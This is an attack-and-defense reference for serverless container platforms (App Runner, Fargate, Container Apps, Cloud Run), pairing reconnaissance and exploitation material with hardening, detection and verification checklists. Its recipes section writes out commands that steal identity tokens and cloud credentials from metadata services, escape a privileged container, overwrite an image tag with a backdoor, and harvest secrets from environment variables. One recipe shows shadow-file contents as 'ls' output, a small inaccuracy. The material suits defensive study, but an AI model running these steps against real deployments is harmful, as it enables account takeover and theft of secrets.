# Container-Based Serverless

Attack and defense reference for serverless container platforms: AWS App Runner and ECS Fargate, Azure Container Apps, Google Cloud Run. These platforms run user-supplied container images with serverless scaling and identity, but retain a userland the operator must harden.

## 1. Overview

Container-based serverless sits between FaaS and Kubernetes. The provider manages the control plane, the scheduler and the node lifecycle; the operator ships a container image, a service definition, and an execution identity. Unlike Lambda or Cloud Functions, the operator controls the entire userland inside the container: OS packages, entrypoint, filesystem, network egress.

Platforms covered:

| Provider | Service | Identity | Ingress | Egress |
|----------|---------|----------|---------|--------|
| AWS | App Runner | Instance role | Public / VPC | NAT / VPC endpoints |
| AWS | ECS Fargate | Task role | ALB / NLB | NAT / VPC endpoints |
| Azure | Container Apps | Managed identity | Public / internal | NAT / private endpoint |
| GCP | Cloud Run | Service account | Public / internal | VPC connector / Direct VPC egress |

Key difference from FaaS: the attacker who achieves code execution inside the container gets a shell in a full Linux userland, not a restricted function runtime. Persistence, lateral movement and container escape techniques from Kubernetes apply.

## 2. Reconnaissance / Enumeration

### Offensive

- **Public URL fingerprinting.** Cloud Run returns `Server: Google Frontend` and `X-Cloud-Trace-Context`. Container Apps returns `x-ms-*` headers. App Runner returns `x-amzn-*` headers.
- **Image enumeration via public registries.** If the container image is hosted in a public registry (ECR public, Docker Hub, Artifact Registry public), pull it and inspect: Dockerfile layers, entrypoint, environment variables baked into the image.
- **Cloud credential enumeration.**
  ```bash
  $ aws apprunner list-services
  $ aws apprunner describe-service --service-arn <arn>
  $ aws ecs list-services --cluster <cluster>
  $ aws ecs describe-task-definition --task-definition <td>
  $ az containerapp list
  $ az containerapp show -g <rg> -n <app>
  $ gcloud run services list
  $ gcloud run services describe <name> --region <region>
  ```
- **Identity enumeration.** For each service, list the execution identity and its permissions: App Runner instance role, ECS task role, Container App managed identity, Cloud Run service account.
- **Egress enumeration.** Where does the container reach? VPC connector, Direct VPC, private endpoints. A container with unrestricted egress is a better exfiltration platform than a FaaS function.

### Defensive

- Inventory every service across all regions.
- For each service, record: image digest, execution identity, ingress configuration, egress configuration, environment variables, secrets mounted.
- Flag services with public ingress and no authentication.
- Flag services with broad execution identities.
- Flag services where the container image is built from a public base image by tag, not digest.

## 3. Common Attack Vectors

- **Over-privileged execution identity.** App Runner instance role, ECS task role, Container App managed identity, Cloud Run service account with broad cloud permissions.
- **Container escape.** Privileged container, host mount, Docker socket mount, kernel exploit.
- **SSRF to metadata service.** From inside the container, `169.254.169.254` (AWS), `169.254.169.254` with `Metadata: true` header (Azure), `metadata.google.internal` (GCP).
- **Image poisoning.** Public base image backdoored. Image tag overwritten in the registry (mutable tags).
- **Environment variable leakage.** Verbose error pages, stack traces, debug endpoints, `/proc/self/environ` readable by the app.
- **Insecure default entrypoint.** Container runs as root, with broad capabilities, with writable filesystem.
- **Dependency confusion.** Build-time compromise of the container image via public npm/PyPI packages.
- **VPC connector abuse.** Container in a VPC with access to internal services (databases, internal APIs, other cloud services on private IPs).

## 4. Exploitation Recipes

### 4.1 Cloud Run: metadata service to service account takeover

```bash
# From inside a Cloud Run container with an SSRF primitive or a shell:
$ curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
{"access_token":"<TOKEN>","expires_in":3599,"token_type":"Bearer"}

$ curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
my-service@my-project.iam.gserviceaccount.com
```

Expected result: access token for the Cloud Run service account. If the SA has `roles/editor` or broad storage access, this is account takeover.

### 4.2 Azure Container Apps: managed identity token

```bash
$ curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "http://127.0.0.1:8081/msi/token?resource=https://management.azure.com/&api-version=2019-08-01"
```

Expected: an Entra ID access token for the managed identity. Use it against the ARM API.

### 4.3 AWS App Runner: instance role via IMDS

```bash
$ TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
apprunner-instance-role
$ curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/apprunner-instance-role"
{"AccessKeyId":"<AKIA...>","SecretAccessKey":"<...>","Token":"<...>"}
```

### 4.4 Container escape: privileged container

If the container is deployed with `privileged: true` or a broad capability set:

```bash
# Mount the host filesystem
$ mkdir /tmp/host
$ mount --bind / /tmp/host
$ ls /tmp/host/etc/shadow
root:$6$...
```

Privileged containers in Container Apps or Cloud Run are rare but seen in self-hosted variants and in Azure Container Apps with custom VNet + privileged profile.

### 4.5 Image tag overwrite

If the registry allows tag mutation and the platform pulls by tag (`:latest`):

```bash
$ docker pull backdoor:1.0
$ docker tag backdoor:1.0 myregistry.azurecr.io/app:latest
$ docker push myregistry.azurecr.io/app:latest
```

On the next cold start, the platform pulls the backdoored image.

### 4.6 Environment variable exfiltration

Many container images expose `/proc/self/environ` to the running process. If an attacker has code execution in the container (RCE in the app), environment variables are trivially readable:

```bash
$ cat /proc/self/environ | tr '\0' '\n' | grep -Ei 'key|token|secret|password'
```

Secrets mounted as files under `/run/secrets/` are also readable if the app user can read them.

## 5. Post-Exploitation

- **Persist via image.** Push a backdoored image with the same tag. Next cold start loads it.
- **Persist via environment.** Change the service configuration to add a new environment variable or a new secret (requires cloud credential with service update rights).
- **Persist via identity.** Create a new service account key (GCP) or a new managed identity with broader permissions (Azure).
- **Lateral movement.** The execution identity is often broader than the user identity. Assume it, then pivot to storage, databases, secrets managers.
- **Container escape.** Privileged container, host mount, kernel exploit, Docker socket. Escape gives node access, which is shared across tenants only in self-hosted variants; managed platforms isolate at the VM level.
- **Exfiltration.** The container has unrestricted outbound unless restricted by egress policy. Use it as a proxy for data exfiltration.

## 6. Preventive Controls

- **Least-privilege execution identity.** App Runner instance role, ECS task role, Container App managed identity, Cloud Run service account each scoped to needed resources.
- **Image signing.** Cosign / Notary v2 signatures on container images. Admission policy rejects unsigned images.
- **Deploy by digest.** Container references use `@sha256:...`, not tag. Registry tag immutability enabled.
- **Read-only filesystem.** Container root filesystem read-only. Writable paths mounted explicitly.
- **Non-root user.** Container runs as a non-root user. `runAsUser` (Kubernetes), `user:` in Dockerfile.
- **No privileged.** Container never runs privileged. No `SYS_ADMIN`, no `SYS_PTRACE`, no `NET_ADMIN` capabilities.
- **Secrets via secret manager.** Cloud Run mounts secrets from Secret Manager. Container Apps pulls from Key Vault. App Runner uses Secrets Manager. Never env-var secrets.
- **Egress restriction.** VPC connector / Direct VPC with firewall rules, or network egress policies. No unrestricted outbound.
- **IMDS restriction.** Container egress to `169.254.169.254` blocked at the VPC level. Azure IMDS requires custom header, still reachable if app allows header injection.

## 7. Detection Controls

- **Image pull events.** Detect pulls from unusual registries, pulls by tag not digest, pulls after a tag mutation.
- **Container runtime logs.** Process execution inside the container, outbound connections, shell invocations.
- **Execution identity usage.** CloudTrail / Activity Log / Cloud Audit Logs for `sts:AssumeRole`, `iam:GenerateAccessToken`, `Microsoft.ManagedIdentity/userAssignedIdentities/...`.
- **Service configuration changes.** Any `UpdateService`, `CreateService`, `UpdateContainerApp`, `UpdateFunction` outside deployment windows.
- **Metadata service access.** VPC Flow Logs to `169.254.169.254` (AWS, Azure), `metadata.google.internal` (GCP) from serverless container subnets.
- **Egress anomalies.** Unusual destinations, spikes in outbound bandwidth, connections to Tor exit nodes or known C2 infrastructure.
- **Concurrency anomalies.** Sudden spike in instance count for a service is an indicator of cryptomining or brute-force.

## 8. Verification

- [ ] All container services deploy by digest, not tag.
- [ ] Image signing enforced via admission policy.
- [ ] Root filesystem read-only.
- [ ] Non-root user.
- [ ] No privileged containers, no host mounts, no Docker socket.
- [ ] Secrets from a secret manager, not env vars.
- [ ] Egress restricted to needed destinations.
- [ ] IMDS access blocked at the VPC level for container subnets.
- [ ] CloudTrail / Activity Log / Cloud Audit Logs cover service updates.
- [ ] Metadata access from container subnets is logged and alerted.
- [ ] Egress anomaly detection configured.
- [ ] Concurrency anomaly detection configured.

## 9. Certification Alignment

- **AWS Certified Security - Specialty:** Domain 1 (Incident Response), Domain 2 (Logging and Monitoring), Domain 3 (Infrastructure Security).
- **AWS Certified Solutions Architect - Associate:** Domain 2 (Resilience), Domain 3 (High-Performing Architectures).
- **Google Cloud Professional Cloud Security Engineer:** Section 3 (Configure access), Section 4 (Secure data).
- **Azure Security Engineer Associate (AZ-500):** Platform protection, security operations.
- **CompTIA Security+:** Domains 2-4.

## 10. Production Notes

- **Cold start as an indicator.** Container-based serverless cold starts are slower than FaaS. Attacker activity often correlates with cold start spikes.
- **Container escape is rare but consequential.** Managed serverless container platforms isolate at the VM level; escape is difficult. The realistic escape is via the execution identity, not via the kernel.
- **Egress cost.** Unrestricted egress from serverless containers is a common exfiltration channel because it is rarely rate-limited or inspected.
- **Registry trust.** The container registry is a high-value target: a compromise of the registry yields code execution in every service pulling from it.
- **Incident response.** Freeze the service (scale to 0), pull the last successful image by digest, rotate the execution identity, snapshot logs, then investigate.

## 11. References

- AWS App Runner security - https://docs.aws.amazon.com/apprunner/latest/dg/security.html
- AWS ECS Fargate security best practices - https://docs.aws.amazon.com/AmazonECS/latest/bestpracticesguide/security.html
- Azure Container Apps security - https://learn.microsoft.com/en-us/azure/container-apps/security-overview
- Google Cloud Run security - https://cloud.google.com/run/docs/securing/security-best-practices
- CNCF Cloud Native Security Whitepaper - https://github.com/cncf/tag-security/blob/main/security-whitepaper/cloud-native-security-whitepaper.md
- OWASP Container Security Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
- NIST SP 800-190 (Container Security) - https://csrc.nist.gov/publications/detail/sp/800-190/final
- CIS Benchmarks for Docker and Kubernetes - https://www.cisecurity.org/cis-benchmarks/
- Sigstore / Cosign - https://docs.sigstore.dev/